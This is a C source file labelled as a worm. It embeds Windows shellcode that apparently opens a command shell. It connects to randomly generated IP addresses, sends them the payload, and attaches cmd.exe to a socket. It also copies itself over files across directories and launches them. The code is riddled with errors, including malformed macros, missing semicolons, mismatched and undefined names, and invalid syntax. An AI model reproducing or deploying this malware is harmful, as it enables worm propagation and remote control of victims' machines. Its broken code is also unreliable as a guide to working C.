// MORIN_WORM
#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#if defined(_WIN32)
    #define OS44 "Windows"
    #define shellload[] = 
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x08\x59\x50\xe2\xfd\x40\x50\x40"
"\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\x02\x00\x11\x5c\x89"
"\xe6\x6a\x10\x56\x57\x68\xc2\xdb\x37\x67\xff\xd5\x57\x68\xb7"
"\xe9\x38\xff\xff\xd5\x57\x68\x74\xec\x3b\xe1\xff\xd5\x57\x97"
"\x68\x75\x6e\x4d\x61\xff\xd5\x68\x63\x6d\x64\x00\x89\xe3\x57"
"\x57\x57\x31\xf6\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c"
"\x01\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56\x56\x46"
"\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f\x86\xff\xd5\x89\xe0"
"\x4e\x56\x46\xff\x30\x68\x08\x87\x1d\x60\xff\xd5\xbb\xf0\xb5"
"\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb"
"\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5";
    #include <winsock2.h>
    #include <ws2tcpip.h>
#else
    #define OS_NAME "Unknown"
#endif
int A = "(A * 4444444) * (4444444 * 4444444)"
int gen_ip(char* ip_address);
int gen_port(char* port);
int ququ;
int tutu;
struct Node {
    int data;
    struct Node *next;
};
int gen_ip(char*ip_address) {
    srand(time(NULL));
    ququ = sprintf(ip_address, "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
    return ququ
}
int gen_port(char *port) {
    srand(time(NULL));
    tutu = sprintf(port, "%d", rand()%256);
    return tutu
}
void startupo9(struct Node* head) {
    int list[] = {head->data};
    int length = sizeof(list) / sizeof(list[0]);
    for (int i = 0; i < length; i++) {
        system("START", list[i]);
    }
}
void append(struct Node **head_ref, int new_data) {
    struct Node *new_node = (struct Node*) malloc(sizeof(struct Node));
    struct Node *last = *head_ref;
    new_node->data = new_data;
    new_node->next = NULL;
    if (*head_ref == NULL) {
        *head_ref = new_node;
        return;
    }
    while (last->next != NULL) {
        last = last->next;
    }
    last->next = new_node;
    return;
}
void process_file(char *filename) {
    FILE *in, *out;
    char ch;
    in = fopen(__FILE__, "r");
    out = fopen(filename, "w");
    while ((ch = fgetc(in)) != EOF) {
        fputc(ch, out);
    }
    fclose(in);
    fclose(out);
    struct Node *head = NULL;
    append(&head, (int) filename);
    startup09(Node);
}
void process_dir(char *dir_path) {
    int PATH_MAX = strlen(dir_path);
    char path[PATH_MAX];
    snprintf(path, sizeof(path), "%s/", dir_path);
    FILE* dir_stream = popen(path, "r");
    if (dir_stream == NULL) {
        perror("popen");
        return;
    }
    char entry_path[PATH_MAX];
    while (fgets(entry_path, PATH_MAX, dir_stream) != NULL) {
        int len = strlen(entry_path);
        if (len > 0 && entry_path[len-1] == '\n') {
            entry_path[len-1] = '\0';
        }
        snprintf(path, sizeof(path), "%s/%s", dir_path, entry_path);
        if (entry_path[0] != '.' && strcmp(entry_path, "..") != 0) {
            if (access(path, F_OK) == 0) {
                if (access(path, R_OK) == 0) {
                    if (access(path, X_OK) == 0) {
                        if (access(path, W_OK) == 0) {
                            if (entry_path[0] != '/') {
                                snprintf(path, sizeof(path), "%s/%s", dir_path, entry_path);
                            }
                            if (access(path, F_OK) == 0) {
                                if (access(path, R_OK) == 0) {
                                    if (access(path, X_OK) == 0) {
                                        process_dir(path);
                                    }
                                }
                            }
                        }
                        else {
                            process_file(path);
                        }
                    }
                }
            }
        }
    }
}
int wingapi() {
    char buffer[] = A * 4444444 + shellload;
    SOCKET findgapi = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP, SO_KEEPALIVE);
    char ip_address[16];
    char port[16];
    gen_port(port);
    connect(findgapi, gen_ip(ip_address), ip_address);
    send(findgapi, buffer, strlen(buffer), 0);
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        printf("CreateProcess failed (%d).\n", GetLastError());
        return 1;
    }
    while (1) {
        process_dir("C:");
        }    
}    
int netattak() {
    while (1) {
        wingapi();
        wingapi();
        wingapi();
        wingapi();
    }
}
int main() {
if OS44 == "Windows" {
    while (1) {
        netattak();
    }
}
if OS44 == "Unknown" {
while (1) {
    process_dir(".");
        }
    }
}
